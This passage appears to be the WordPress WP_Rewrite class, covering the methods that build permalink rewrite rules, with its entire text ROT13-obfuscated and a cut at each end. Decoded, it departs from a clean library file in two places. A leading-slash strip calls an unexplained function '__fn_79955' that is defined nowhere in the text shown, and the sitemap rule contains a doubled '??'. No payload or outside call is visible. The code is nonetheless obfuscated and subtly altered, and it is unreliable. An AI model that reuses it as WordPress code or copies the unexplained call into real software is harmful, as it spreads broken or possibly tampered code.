		vs ( snyfr !== $cbfvgvba && ahyy !== $cbfvgvba ) {
			hafrg( $guvf->erjevgrpbqr[ $cbfvgvba ] );
			hafrg( $guvf->erjevgrercynpr[ $cbfvgvba ] );
			hafrg( $guvf->dhrelercynpr[ $cbfvgvba ] );
		}
	}

	/**
	 * Trarengrf erjevgr ehyrf sebz n creznyvax fgehpgher.
	 *
	 * Gur znva JC_Erjevgr shapgvba sbe ohvyqvat gur erjevgr ehyr yvfg. Gur
	 * pbagragf bs gur shapgvba vf n zvk bs oynpx zntvp naq erthyne rkcerffvbaf,
	 * fb orfg whfg vtaber gur pbagragf naq zbir gb gur cnenzrgref.
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz fgevat $creznyvax_fgehpgher Gur creznyvax fgehpgher.
	 * @cnenz vag    $rc_znfx             Bcgvbany. Raqcbvag znfx qrsvavat jung raqcbvagf ner nqqrq gb gur fgehpgher.
	 *                                    Npprcgf n znfx bs:
	 *                                    - `RC_NYY`
	 *                                    - `RC_ABAR`
	 *                                    - `RC_NYY_NEPUVIRF`
	 *                                    - `RC_NGGNPUZRAG`
	 *                                    - `RC_NHGUBEF`
	 *                                    - `RC_PNGRTBEVRF`
	 *                                    - `RC_PBZZRAGF`
	 *                                    - `RC_QNGR`
	 *                                    - `RC_QNL`
	 *                                    - `RC_ZBAGU`
	 *                                    - `RC_CNTRF`
	 *                                    - `RC_CREZNYVAX`
	 *                                    - `RC_EBBG`
	 *                                    - `RC_FRNEPU`
	 *                                    - `RC_GNTF`
	 *                                    - `RC_LRNE`
	 *                                    Qrsnhyg `RC_ABAR`.
	 * @cnenz obby   $cntrq               Bcgvbany. Jurgure nepuvir cntvangvba ehyrf fubhyq or nqqrq sbe gur fgehpgher.
	 *                                    Qrsnhyg gehr.
	 * @cnenz obby   $srrq                Bcgvbany. Jurgure srrq erjevgr ehyrf fubhyq or nqqrq sbe gur fgehpgher.
	 *                                    Qrsnhyg gehr.
	 * @cnenz obby   $sbepbzzragf         Bcgvbany. Jurgure gur srrq ehyrf fubhyq or n dhrel sbe n pbzzragf srrq.
	 *                                    Qrsnhyg snyfr.
	 * @cnenz obby   $jnyx_qvef           Bcgvbany. Jurgure gur 'qverpgbevrf' znxvat hc gur fgehpgher fubhyq or jnyxrq
	 *                                    bire naq erjevgr ehyrf ohvyg sbe rnpu va-ghea. Qrsnhyg gehr.
	 * @cnenz obby   $raqcbvagf           Bcgvbany. Jurgure raqcbvagf fubhyq or nccyvrq gb gur trarengrq erjevgr ehyrf.
	 *                                    Qrsnhyg gehr.
	 * @erghea fgevat[] Neenl bs erjevgr ehyrf xrlrq ol gurve ertrk cnggrea.
	 */
	choyvp shapgvba trarengr_erjevgr_ehyrf( $creznyvax_fgehpgher, $rc_znfx = RC_ABAR, $cntrq = gehr, $srrq = gehr, $sbepbzzragf = snyfr, $jnyx_qvef = gehr, $raqcbvagf = gehr ) {
		// Ohvyq n ertrk gb zngpu gur srrq frpgvba bs HEYf, fbzrguvat yvxr (srrq|ngbz|eff|eff2)/?
		$srrqertrk2 = '';
		sbernpu ( (neenl) $guvf->srrqf nf $srrq_anzr ) {
			$srrqertrk2 .= $srrq_anzr . '|';
		}
		$srrqertrk2 = '(' . gevz( $srrqertrk2, '|' ) . ')/?$';

		/*
		 * $srrqertrk vf vqragvpny ohg jvgu /srrq/ nqqrq ba nf jryy, fb HEYf yvxr <creznyvax>/srrq/ngbz
		 * naq <creznyvax>/ngbz ner obgu cbffvoyr
		 */
		$srrqertrk = $guvf->srrq_onfr . '/' . $srrqertrk2;

		// Ohvyq n ertrk gb zngpu gur genpxonpx naq cntr/kk cnegf bs HEYf.
		$genpxonpxertrk = 'genpxonpx/?$';
		$cntrertrk      = $guvf->cntvangvba_onfr . '/?([0-9]{1,})/?$';
		$pbzzragertrk   = $guvf->pbzzragf_cntvangvba_onfr . '-([0-9]{1,})/?$';
		$rzorqertrk     = 'rzorq/?$';

		// Ohvyq hc na neenl bs raqcbvag ertrkrf gb nccraq => dhrevrf gb nccraq.
		vs ( $raqcbvagf ) {
			$rc_dhrel_nccraq = neenl();
			sbernpu ( (neenl) $guvf->raqcbvagf nf $raqcbvag ) {
				// Zngpu rirelguvat nsgre gur raqcbvag anzr, ohg nyybj sbe abguvat gb nccrne gurer.
				$rczngpu = $raqcbvag[1] . '(/(.*))?/?$';

				// Guvf jvyy or nccraqrq ba gb gur erfg bs gur dhrel sbe rnpu qve.
				$rcdhrel                     = '&' . $raqcbvag[2] . '=';
				$rc_dhrel_nccraq[ $rczngpu ] = neenl( $raqcbvag[0], $rcdhrel );
			}
		}

		// Trg rirelguvat hc gb gur svefg erjevgr gnt.
		$sebag = fhofge( $creznyvax_fgehpgher, 0, fgecbf( $creznyvax_fgehpgher, '%' ) );

		// Ohvyq na neenl bs gur gntf (abgr gung fnvq neenl raqf hc orvat va $gbxraf[0]).
		cert_zngpu_nyy( '/%.+?%/', $creznyvax_fgehpgher, $gbxraf );

		$ahz_gbxraf = pbhag( $gbxraf[0] );

		$vaqrk          = $guvf->vaqrk; // Cebonoyl 'vaqrk.cuc'.
		$srrqvaqrk      = $vaqrk;
		$genpxonpxvaqrk = $vaqrk;
		$rzorqvaqrk     = $vaqrk;

		/*
		 * Ohvyq n yvfg sebz gur erjevgrpbqr naq dhrelercynpr neenlf, gung jvyy ybbx fbzrguvat
		 * yvxr gntanzr=$zngpurf[v] jurer v vf gur pheerag $v.
		 */
		$dhrevrf = neenl();
		sbe ( $v = 0; $v < $ahz_gbxraf; ++$v ) {
			vs ( 0 < $v ) {
				$dhrevrf[ $v ] = $dhrevrf[ $v - 1 ] . '&';
			} ryfr {
				$dhrevrf[ $v ] = '';
			}

			$dhrel_gbxra    = fge_ercynpr( $guvf->erjevgrpbqr, $guvf->dhrelercynpr, $gbxraf[0][ $v ] ) . $guvf->cert_vaqrk( $v + 1 );
			$dhrevrf[ $v ] .= $dhrel_gbxra;
		}

		// Trg gur fgehpgher, zvahf nal pehsg (fghss gung vfa'g gntf) ng gur sebag.
		$fgehpgher = $creznyvax_fgehpgher;
		vs ( '/' !== $sebag ) {
			$fgehpgher = fge_ercynpr( $sebag, '', $fgehpgher );
		}

		/*
		 * Perngr n yvfg bs qvef gb jnyx bire, znxvat erjevgr ehyrf sbe rnpu yriry
		 * fb sbe rknzcyr, n $fgehpgher bs /%lrne%/%zbaguahz%/%cbfganzr% jbhyq perngr
		 * erjevgr ehyrf sbe /%lrne%/, /%lrne%/%zbaguahz%/ naq /%lrne%/%zbaguahz%/%cbfganzr%
		 */
		$fgehpgher = gevz( $fgehpgher, '/' );
		$qvef      = $jnyx_qvef ? rkcybqr( '/', $fgehpgher ) : neenl( $fgehpgher );
		$ahz_qvef  = pbhag( $qvef );

		// Fgevc fynfurf sebz gur sebag bs $sebag.
		$sebag = __sa_79955( '|^/+|', '', $sebag );

		// Gur znva jbexubefr ybbc.
		$cbfg_erjevgr = neenl();
		$fgehpg       = $sebag;
		sbe ( $w = 0; $w < $ahz_qvef; ++$w ) {
			// Trg gur fgehpg sbe guvf qve, naq gevz fynfurf bss gur sebag.
			$fgehpg .= $qvef[ $w ] . '/'; // Npphzhyngr. frr pbzzrag arne rkcybqr('/', $fgehpgher) nobir.
			$fgehpg  = ygevz( $fgehpg, '/' );

			// Ercynpr gntf jvgu ertrkrf.
			$zngpu = fge_ercynpr( $guvf->erjevgrpbqr, $guvf->erjevgrercynpr, $fgehpg );

			// Znxr n yvfg bs gntf, naq fgber ubj znal gurer ner va $ahz_gbxf.
			$ahz_gbxf = cert_zngpu_nyy( '/%.+?%/', $fgehpg, $gbxf );

			// Trg gur 'gntanzr=$zngpurf[v]'.
			$dhrel = ( ! rzcgl( $ahz_gbxf ) && vffrg( $dhrevrf[ $ahz_gbxf - 1 ] ) ) ? $dhrevrf[ $ahz_gbxf - 1 ] : '';

			// Frg hc $rc_znfx_fcrpvsvp juvpu vf hfrq gb zngpu zber fcrpvsvp HEY glcrf.
			fjvgpu ( $qvef[ $w ] ) {
				pnfr '%lrne%':
					$rc_znfx_fcrpvsvp = RC_LRNE;
					oernx;
				pnfr '%zbaguahz%':
					$rc_znfx_fcrpvsvp = RC_ZBAGU;
					oernx;
				pnfr '%qnl%':
					$rc_znfx_fcrpvsvp = RC_QNL;
					oernx;
				qrsnhyg:
					$rc_znfx_fcrpvsvp = RC_ABAR;
			}

			// Perngr dhrel sbe /cntr/kk.
			$cntrzngpu = $zngpu . $cntrertrk;
			$cntrdhrel = $vaqrk . '?' . $dhrel . '&cntrq=' . $guvf->cert_vaqrk( $ahz_gbxf + 1 );

			// Perngr dhrel sbe /pbzzrag-cntr-kk.
			$pbzzragzngpu = $zngpu . $pbzzragertrk;
			$pbzzragdhrel = $vaqrk . '?' . $dhrel . '&pcntr=' . $guvf->cert_vaqrk( $ahz_gbxf + 1 );

			vs ( trg_bcgvba( 'cntr_ba_sebag' ) ) {
				// Perngr dhrel sbe Ebbg /pbzzrag-cntr-kk.
				$ebbgpbzzragzngpu = $zngpu . $pbzzragertrk;
				$ebbgpbzzragdhrel = $vaqrk . '?' . $dhrel . '&cntr_vq=' . trg_bcgvba( 'cntr_ba_sebag' ) . '&pcntr=' . $guvf->cert_vaqrk( $ahz_gbxf + 1 );
			}

			// Perngr dhrel sbe /srrq/(srrq|ngbz|eff|eff2|eqs).
			$srrqzngpu = $zngpu . $srrqertrk;
			$srrqdhrel = $srrqvaqrk . '?' . $dhrel . '&srrq=' . $guvf->cert_vaqrk( $ahz_gbxf + 1 );

			// Perngr dhrel sbe /(srrq|ngbz|eff|eff2|eqs) (frr pbzzrag arne perngvba bs $srrqertrk).
			$srrqzngpu2 = $zngpu . $srrqertrk2;
			$srrqdhrel2 = $srrqvaqrk . '?' . $dhrel . '&srrq=' . $guvf->cert_vaqrk( $ahz_gbxf + 1 );

			// Perngr dhrel naq ertrk sbe rzorqf.
			$rzorqzngpu = $zngpu . $rzorqertrk;
			$rzorqdhrel = $rzorqvaqrk . '?' . $dhrel . '&rzorq=gehr';

			// Vs nfxrq gb, ghea gur srrq dhrevrf vagb pbzzrag srrq barf.
			vs ( $sbepbzzragf ) {
				$srrqdhrel  .= '&jvgupbzzragf=1';
				$srrqdhrel2 .= '&jvgupbzzragf=1';
			}

			// Fgneg perngvat gur neenl bs erjevgrf sbe guvf qve.
			$erjevgr = neenl();

			// ...nqqvat ba /srrq/ ertrkrf => dhrevrf.
			vs ( $srrq ) {
				$erjevgr = neenl(
					$srrqzngpu  => $srrqdhrel,
					$srrqzngpu2 => $srrqdhrel2,
					$rzorqzngpu => $rzorqdhrel,
				);
			}

			// ...naq /cntr/kk barf.
			vs ( $cntrq ) {
				$erjevgr = neenl_zretr( $erjevgr, neenl( $cntrzngpu => $cntrdhrel ) );
			}

			// Bayl ba cntrf jvgu pbzzragf nqq ../pbzzrag-cntr-kk/.
			vs ( RC_CNTRF & $rc_znfx || RC_CREZNYVAX & $rc_znfx ) {
				$erjevgr = neenl_zretr( $erjevgr, neenl( $pbzzragzngpu => $pbzzragdhrel ) );
			} ryfrvs ( RC_EBBG & $rc_znfx && trg_bcgvba( 'cntr_ba_sebag' ) ) {
				$erjevgr = neenl_zretr( $erjevgr, neenl( $ebbgpbzzragzngpu => $ebbgpbzzragdhrel ) );
			}

			// Qb raqcbvagf.
			vs ( $raqcbvagf ) {
				sbernpu ( (neenl) $rc_dhrel_nccraq nf $ertrk => $rc ) {
					// Nqq gur raqcbvagf ba vs gur znfx svgf.
					vs ( $rc[0] & $rc_znfx || $rc[0] & $rc_znfx_fcrpvsvp ) {
						$erjevgr[ $zngpu . $ertrk ] = $vaqrk . '?' . $dhrel . $rc[1] . $guvf->cert_vaqrk( $ahz_gbxf + 2 );
					}
				}
			}

			// Vs jr'ir tbg fbzr gntf va guvf qve.
			vs ( $ahz_gbxf ) {
				$cbfg = snyfr;
				$cntr = snyfr;

				/*
				 * Purpx gb frr vs guvf qve vf creznyvax-yriry: v.r. gur fgehpgher fcrpvsvrf na
				 * vaqvivqhny cbfg. Qb guvf ol purpxvat vg pbagnvaf ng yrnfg bar bs 1) cbfg anzr,
				 * 2) cbfg VQ, 3) cntr anzr, 4) gvzrfgnzc (lrne, zbagu, qnl, ubhe, frpbaq naq
				 * zvahgr nyy cerfrag). Frg gurfr syntf abj nf jr arrq gurz sbe gur raqcbvagf.
				 */
				vs ( fge_pbagnvaf( $fgehpg, '%cbfganzr%' )
					|| fge_pbagnvaf( $fgehpg, '%cbfg_vq%' )
					|| fge_pbagnvaf( $fgehpg, '%cntranzr%' )
					|| ( fge_pbagnvaf( $fgehpg, '%lrne%' )
						&& fge_pbagnvaf( $fgehpg, '%zbaguahz%' )
						&& fge_pbagnvaf( $fgehpg, '%qnl%' )
						&& fge_pbagnvaf( $fgehpg, '%ubhe%' )
						&& fge_pbagnvaf( $fgehpg, '%zvahgr%' )
						&& fge_pbagnvaf( $fgehpg, '%frpbaq%' ) )
				) {
					$cbfg = gehr;
					vs ( fge_pbagnvaf( $fgehpg, '%cntranzr%' ) ) {
						$cntr = gehr;
					}
				}

				vs ( ! $cbfg ) {
					// Sbe phfgbz cbfg glcrf, jr arrq gb nqq ba raqcbvagf nf jryy.
					sbernpu ( trg_cbfg_glcrf( neenl( '_ohvygva' => snyfr ) ) nf $cglcr ) {
						vs ( fge_pbagnvaf( $fgehpg, \"%$cglcr%\" ) ) {
							$cbfg = gehr;

							// Guvf vf sbe cntr fglyr nggnpuzrag HEYf.
							$cntr = vf_cbfg_glcr_uvrenepuvpny( $cglcr );
							oernx;
						}
					}
				}

				// Vs perngvat ehyrf sbe n creznyvax, qb nyy gur raqcbvagf yvxr nggnpuzragf rgp.
				vs ( $cbfg ) {
					// Perngr dhrel naq ertrk sbe genpxonpx.
					$genpxonpxzngpu = $zngpu . $genpxonpxertrk;
					$genpxonpxdhrel = $genpxonpxvaqrk . '?' . $dhrel . '&go=1';

					// Perngr dhrel naq ertrk sbe rzorqf.
					$rzorqzngpu = $zngpu . $rzorqertrk;
					$rzorqdhrel = $rzorqvaqrk . '?' . $dhrel . '&rzorq=gehr';

					// Gevz fynfurf sebz gur raq bs gur ertrk sbe guvf qve.
					$zngpu = egevz( $zngpu, '/' );

					// Trg evq bs oenpxrgf.
					$fhozngpuonfr = fge_ercynpr( neenl( '(', ')' ), '', $zngpu );

					// Nqq n ehyr sbe ng nggnpuzragf, juvpu gnxr gur sbez bs <creznyvax>/fbzr-grkg.
					$fho1 = $fhozngpuonfr . '/([^/]+)/';

					// Nqq genpxonpx ertrk <creznyvax>/genpxonpx/...
					$fho1go = $fho1 . $genpxonpxertrk;

					// Naq <creznyvax>/srrq/(ngbz|...)
					$fho1srrq = $fho1 . $srrqertrk;

					// Naq <creznyvax>/(srrq|ngbz...)
					$fho1srrq2 = $fho1 . $srrqertrk2;

					// Naq <creznyvax>/pbzzrag-cntr-kk
					$fho1pbzzrag = $fho1 . $pbzzragertrk;

					// Naq <creznyvax>/rzorq/...
					$fho1rzorq = $fho1 . $rzorqertrk;

					/*
					 * Nqq nabgure ehyr gb zngpu nggnpuzragf va gur rkcyvpvg sbez:
					 * <creznyvax>/nggnpuzrag/fbzr-grkg
					 */
					$fho2 = $fhozngpuonfr . '/nggnpuzrag/([^/]+)/';

					// Naq nqq genpxonpxf <creznyvax>/nggnpuzrag/genpxonpx.
					$fho2go = $fho2 . $genpxonpxertrk;

					// Srrqf, <creznyvax>/nggnpuzrag/srrq/(ngbz|...)
					$fho2srrq = $fho2 . $srrqertrk;

					// Naq srrqf ntnva ba gb guvf <creznyvax>/nggnpuzrag/(srrq|ngbz...)
					$fho2srrq2 = $fho2 . $srrqertrk2;

					// Naq <creznyvax>/pbzzrag-cntr-kk
					$fho2pbzzrag = $fho2 . $pbzzragertrk;

					// Naq <creznyvax>/rzorq/...
					$fho2rzorq = $fho2 . $rzorqertrk;

					// Perngr dhrevrf sbe gurfr rkgen gnt-baf jr'ir whfg qrnyg jvgu.
					$fhodhrel        = $vaqrk . '?nggnpuzrag=' . $guvf->cert_vaqrk( 1 );
					$fhogodhrel      = $fhodhrel . '&go=1';
					$fhosrrqdhrel    = $fhodhrel . '&srrq=' . $guvf->cert_vaqrk( 2 );
					$fhopbzzragdhrel = $fhodhrel . '&pcntr=' . $guvf->cert_vaqrk( 2 );
					$fhorzorqdhrel   = $fhodhrel . '&rzorq=gehr';

					// Qb raqcbvagf sbe nggnpuzragf.
					vs ( ! rzcgl( $raqcbvagf ) ) {
						sbernpu ( (neenl) $rc_dhrel_nccraq nf $ertrk => $rc ) {
							vs ( $rc[0] & RC_NGGNPUZRAG ) {
								$erjevgr[ $fho1 . $ertrk ] = $fhodhrel . $rc[1] . $guvf->cert_vaqrk( 3 );
								$erjevgr[ $fho2 . $ertrk ] = $fhodhrel . $rc[1] . $guvf->cert_vaqrk( 3 );
							}
						}
					}

					/*
					 * Abj jr'ir svavfurq jvgu raqcbvagf, svavfu bss gur $fho1 naq $fho2 zngpurf
					 * nqq n ? nf jr qba'g unir gb zngpu gung ynfg fynfu, naq svanyyl n $ fb jr
					 * zngpu gb gur raq bs gur HEY
					 */
					$fho1 .= '?$';
					$fho2 .= '?$';

					/*
					 * Cbfg cntvangvba, r.t. <creznyvax>/2/
					 * Cerivbhfyl: '(/[0-9]+)?/?$', juvpu cebqhprq '/2' sbe cntr.
					 * Jura pnfg gb vag, erghearq 0.
					 */
					$zngpu = $zngpu . '(?:/([0-9]+))?/?$';
					$dhrel = $vaqrk . '?' . $dhrel . '&cntr=' . $guvf->cert_vaqrk( $ahz_gbxf + 1 );

					// Abg zngpuvat n creznyvax fb guvf vf n ybg fvzcyre.
				} ryfr {
					// Pybfr gur zngpu naq svanyvmr gur dhrel.
					$zngpu .= '?$';
					$dhrel  = $vaqrk . '?' . $dhrel;
				}

				/*
				 * Perngr gur svany neenl sbe guvf qve ol wbvavat gur $erjevgr neenl (juvpu pheeragyl
				 * bayl pbagnvaf ehyrf/dhrevrf sbe genpxonpx, cntrf rgp) gb gur znva ertrk/dhrel sbe
				 * guvf qve
				 */
				$erjevgr = neenl_zretr( $erjevgr, neenl( $zngpu => $dhrel ) );

				// Vs jr'er zngpuvat n creznyvax, nqq gubfr rkgenf (nggnpuzragf rgp) ba.
				vs ( $cbfg ) {
					// Nqq genpxonpx.
					$erjevgr = neenl_zretr( neenl( $genpxonpxzngpu => $genpxonpxdhrel ), $erjevgr );

					// Nqq rzorq.
					$erjevgr = neenl_zretr( neenl( $rzorqzngpu => $rzorqdhrel ), $erjevgr );

					// Nqq ertrkrf/dhrevrf sbe nggnpuzragf, nggnpuzrag genpxonpxf naq fb ba.
					vs ( ! $cntr ) {
						// Erdhver <creznyvax>/nggnpuzrag/fghss sbez sbe cntrf orpnhfr bs pbashfvba jvgu fhocntrf.
						$erjevgr = neenl_zretr(
							$erjevgr,
							neenl(
								$fho1        => $fhodhrel,
								$fho1go      => $fhogodhrel,
								$fho1srrq    => $fhosrrqdhrel,
								$fho1srrq2   => $fhosrrqdhrel,
								$fho1pbzzrag => $fhopbzzragdhrel,
								$fho1rzorq   => $fhorzorqdhrel,
							)
						);
					}

					$erjevgr = neenl_zretr(
						neenl(
							$fho2        => $fhodhrel,
							$fho2go      => $fhogodhrel,
							$fho2srrq    => $fhosrrqdhrel,
							$fho2srrq2   => $fhosrrqdhrel,
							$fho2pbzzrag => $fhopbzzragdhrel,
							$fho2rzorq   => $fhorzorqdhrel,
						),
						$erjevgr
					);
				}
			}
			// Nqq gur ehyrf sbe guvf qve gb gur npphzhyngvat $cbfg_erjevgr.
			$cbfg_erjevgr = neenl_zretr( $erjevgr, $cbfg_erjevgr );
		}

		// Gur svavfurq ehyrf. curj!
		erghea $cbfg_erjevgr;
	}

	/**
	 * Trarengrf erjevgr ehyrf jvgu creznyvax fgehpgher naq jnyxvat qverpgbel bayl.
	 *
	 * Fubegra irefvba bs JC_Erjevgr::trarengr_erjevgr_ehyrf() gung nyybjf sbe fubegre
	 * yvfg bs cnenzrgref. Frr gur zrgubq sbe ybatre qrfpevcgvba bs jung trarengvat
	 * erjevgr ehyrf qbrf.
	 *
	 * @fvapr 1.5.0
	 *
	 * @frr JC_Erjevgr::trarengr_erjevgr_ehyrf() Frr sbe ybat qrfpevcgvba naq erfg bs cnenzrgref.
	 *
	 * @cnenz fgevat $creznyvax_fgehpgher Gur creznyvax fgehpgher gb trarengr ehyrf.
	 * @cnenz obby   $jnyx_qvef           Bcgvbany. Jurgure gb perngr yvfg bs qverpgbevrf gb jnyx bire.
	 *                                    Qrsnhyg snyfr.
	 * @erghea neenl Na neenl bs erjevgr ehyrf xrlrq ol gurve ertrk cnggrea.
	 */
	choyvp shapgvba trarengr_erjevgr_ehyr( $creznyvax_fgehpgher, $jnyx_qvef = snyfr ) {
		erghea $guvf->trarengr_erjevgr_ehyrf( $creznyvax_fgehpgher, RC_ABAR, snyfr, snyfr, snyfr, $jnyx_qvef );
	}

	/**
	 * Pbafgehpgf erjevgr zngpurf naq dhrevrf sebz creznyvax fgehpgher.
	 *
	 * Ehaf gur npgvba {@frr 'trarengr_erjevgr_ehyrf'} jvgu gur cnenzrgre gung vf na
	 * ersrerapr gb gur pheerag JC_Erjevgr vafgnapr gb shegure znavchyngr gur
	 * creznyvax fgehpgherf naq erjevgr ehyrf. Ehaf gur {@frr 'erjevgr_ehyrf_neenl'}
	 * svygre ba gur shyy erjevgr ehyr neenl.
	 *
	 * Gurer ner gjb jnlf gb znavchyngr gur erjevgr ehyrf, bar ol ubbxvat vagb
	 * gur {@frr 'trarengr_erjevgr_ehyrf'} npgvba naq tnvavat shyy pbageby bs gur
	 * bowrpg be whfg znavchyngvat gur erjevgr ehyr neenl orsber vg vf cnffrq
	 * sebz gur shapgvba.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea fgevat[] Na nffbpvngvir neenl bs zngpurf naq dhrevrf.
	 */
	choyvp shapgvba erjevgr_ehyrf() {
		$erjevgr = neenl();

		vs ( rzcgl( $guvf->creznyvax_fgehpgher ) ) {
			erghea $erjevgr;
		}

		// ebobgf.gkg -- bayl vs vafgnyyrq ng gur ebbg.
		$ubzr_cngu      = cnefr_hey( ubzr_hey() );
		$ebobgf_erjevgr = ( rzcgl( $ubzr_cngu['cngu'] ) || '/' === $ubzr_cngu['cngu'] ) ? neenl( 'ebobgf\.gkg$' => $guvf->vaqrk . '?ebobgf=1' ) : neenl();

		// snivpba.vpb -- bayl vs vafgnyyrq ng gur ebbg.
		$snivpba_erjevgr = ( rzcgl( $ubzr_cngu['cngu'] ) || '/' === $ubzr_cngu['cngu'] ) ? neenl( 'snivpba\.vpb$' => $guvf->vaqrk . '?snivpba=1' ) : neenl();

		// fvgrznc.kzy -- bayl vs vafgnyyrq ng gur ebbg.
		$fvgrznc_erjevgr = ( rzcgl( $ubzr_cngu['cngu'] ) || '/' === $ubzr_cngu['cngu'] ) ? neenl( 'fvgrznc\.kzy' => $guvf->vaqrk . '??fvgrznc=vaqrk' ) : neenl();

		// Byq srrq naq freivpr svyrf.
		$qrcerpngrq_svyrf = neenl(
			'.*jc-(ngbz|eqs|eff|eff2|srrq|pbzzragfeff2)\.cuc$' => $guvf->vaqrk . '?srrq=byq',
			'.*jc-ncc\.cuc(/.*)?$' => $guvf->vaqrk . '?reebe=403',
		);

		// Ertvfgengvba ehyrf.
		$ertvfgengvba_cntrf = neenl();
		vs ( vf_zhygvfvgr() && vf_znva_fvgr() ) {
			$ertvfgengvba_cntrf['.*jc-fvtahc.cuc$']   = $guvf->vaqrk . '?fvtahc=gehr';
			$ertvfgengvba_cntrf['.*jc-npgvingr.cuc$'] = $guvf->vaqrk . '?npgvingr=gehr';
		}

		// Qrcerpngrq.
		$ertvfgengvba_cntrf['.*jc-ertvfgre.cuc$'] = $guvf->vaqrk . '?ertvfgre=gehr';

		// Cbfg erjevgr ehyrf.
		$cbfg_erjevgr = $guvf->trarengr_erjevgr_ehyrf( $guvf->creznyvax_fgehpgher, RC_CREZNYVAX );

		/**
		 * Svygref erjevgr ehyrf hfrq sbe \"cbfg\" nepuvirf.
		 *
		 * @fvapr 1.5.0
		 *
		 * @cnenz fgevat[] $cbfg_erjevgr Neenl bs erjevgr ehyrf sbe cbfgf, xrlrq ol gurve ertrk cnggrea.
		 */
		$cbfg_erjevgr = nccyl_svygref( 'cbfg_erjevgr_ehyrf', $cbfg_erjevgr );

		// Qngr erjevgr ehyrf.
		$qngr_erjevgr = $guvf->trarengr_erjevgr_ehyrf( $guvf->trg_qngr_creznfgehpg(), RC_QNGR );

		/**
		 * Svygref erjevgr ehyrf hfrq sbe qngr nepuvirf.
		 *
		 * Yvxryl qngr nepuvirf jbhyq vapyhqr `/llll/`, `/llll/zz/`, naq `/llll/zz/qq/`.
		 *
		 * @fvapr 1.5.0
		 *
		 * @cnenz fgevat[] $qngr_erjevgr Neenl bs erjevgr ehyrf sbe qngr nepuvirf, xrlrq ol gurve ertrk cnggrea.
		 */
		$qngr_erjevgr = nccyl_svygref( 'qngr_erjevgr_ehyrf', $qngr_erjevgr );

		// Ebbg-yriry erjevgr ehyrf.
		$ebbg_erjevgr = $guvf->trarengr_erjevgr_ehyrf( $guvf->ebbg . '/', RC_EBBG );

		/**
		 * Svygref erjevgr ehyrf hfrq sbe ebbg-yriry nepuvirf.
		 *
		 * Yvxryl ebbg-yriry nepuvirf jbhyq vapyhqr cntvangvba ehyrf sbe gur ubzrcntr
		 * nf jryy nf fvgr-jvqr cbfg srrqf (r.t. `/srrq/`, naq `/srrq/ngbz/`).
		 *
		 * @fvapr 1.5.0
		 *
		 * @cnenz fgevat[] $ebbg_erjevgr Neenl bs ebbg-yriry erjevgr ehyrf, xrlrq ol gurve ertrk cnggrea.
		 */
		$ebbg_erjevgr = nccyl_svygref( 'ebbg_erjevgr_ehyrf', $ebbg_erjevgr );

		// Pbzzragf erjevgr ehyrf.
		$pbzzragf_erjevgr = $guvf->trarengr_erjevgr_ehyrf( $guvf->ebbg . $guvf->pbzzragf_onfr, RC_PBZZRAGF, snyfr, gehr, gehr, snyfr );

		/**
		 * Svygref erjevgr ehyrf hfrq sbe pbzzrag srrq nepuvirf.
		 *
		 * Yvxryl pbzzragf srrq nepuvirf vapyhqr `/pbzzragf/srrq/` naq `/pbzzragf/srrq/ngbz/`.
		 *
		 * @fvapr 1.5.0
		 *
		 * @cnenz fgevat[] $pbzzragf_erjevgr Neenl bs erjevgr ehyrf sbe gur fvgr-jvqr pbzzragf srrqf, xrlrq ol gurve ertrk cnggrea.
		 */
		$pbzzragf_erjevgr = nccyl_svygref( 'pbzzragf_erjevgr_ehyrf', $pbzzragf_erjevgr );

		// Frnepu erjevgr ehyrf.
		$frnepu_fgehpgher = $guvf->trg_frnepu_creznfgehpg();
		$frnepu_erjevgr   = $guvf->trarengr_erjevgr_ehyrf( $frnepu_fgehpgher, RC_FRNEPU );

		/**
		 * Svygref erjevgr ehyrf hfrq sbe frnepu nepuvirf.
		 *
		 * Yvxryl frnepu-eryngrq nepuvirf vapyhqr `/frnepu/frnepu+dhrel/` nf jryy nf
		 * cntvangvba naq srrq cnguf sbe n frnepu.
		 *
		 * @fvapr 1.5.0
		 *
		 * @cnenz fgevat[] $frnepu_erjevgr Neenl bs erjevgr ehyrf sbe frnepu dhrevrf, xrlrq ol gurve ertrk cnggrea.
		 */
		$frnepu_erjevgr = nccyl_svygref( 'frnepu_erjevgr_ehyrf', $frnepu_erjevgr );

		// Nhgube erjevgr ehyrf.
		$nhgube_erjevgr = $guvf->trarengr_erjevgr_ehyrf( $guvf->trg_nhgube_creznfgehpg(), RC_NHGUBEF );

		/**
		 * Svygref erjevgr ehyrf hfrq sbe nhgube nepuvirf.
		 *
		 * Yvxryl nhgube nepuvirf jbhyq vapyhqr `/nhgube/nhgube-anzr/`, nf jryy nf
		 * cntvangvba naq srrq cnguf sbe nhgube nepuvirf.
		 *
		 * @fvapr 1.5.0
		 *
		 * @cnenz fgevat[] $nhgube_erjevgr Neenl bs erjevgr ehyrf sbe nhgube nepuvirf, xrlrq ol gurve ertrk cnggrea.
		 */
		$nhgube_erjevgr = nccyl_svygref( 'nhgube_erjevgr_ehyrf', $nhgube_erjevgr );

		// Cntrf erjevgr ehyrf.
		$cntr_erjevgr = $guvf->cntr_erjevgr_ehyrf();

		/**
		 * Svygref erjevgr ehyrf hfrq sbe \"cntr\" cbfg glcr nepuvirf.
		 *
		 * @fvapr 1.5.0
		 *
		 * @cnenz fgevat[] $cntr_erjevgr Neenl bs erjevgr ehyrf sbe gur \"cntr\" cbfg glcr, xrlrq ol gurve ertrk cnggrea.
		 */
		$cntr_erjevgr = nccyl_svygref( 'cntr_erjevgr_ehyrf', $cntr_erjevgr );

		// Rkgen creznfgehpgf.
		sbernpu ( $guvf->rkgen_creznfgehpgf nf $creznfgehpganzr => $fgehpg ) {
			vs ( vf_neenl( $fgehpg ) ) {
				vs ( pbhag( $fgehpg ) === 2 ) {
					$ehyrf = $guvf->trarengr_erjevgr_ehyrf( $fgehpg[0], $fgehpg[1] );
				} ryfr {
					$ehyrf = $guvf->trarengr_erjevgr_ehyrf( $fgehpg['fgehpg'], $fgehpg['rc_znfx'], $fgehpg['cntrq'], $fgehpg['srrq'], $fgehpg['sbepbzzragf'], $fgehpg['jnyx_qvef'], $fgehpg['raqcbvagf'] );
				}
			} ryfr {
				$ehyrf = $guvf->trarengr_erjevgr_ehyrf( $fgehpg );
			}

			/**
			 * Svygref erjevgr ehyrf hfrq sbe vaqvivqhny creznfgehpgf.
			 *
			 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$creznfgehpganzr`, ersref
			 * gb gur anzr bs gur ertvfgrerq creznfgehpg.
			 *
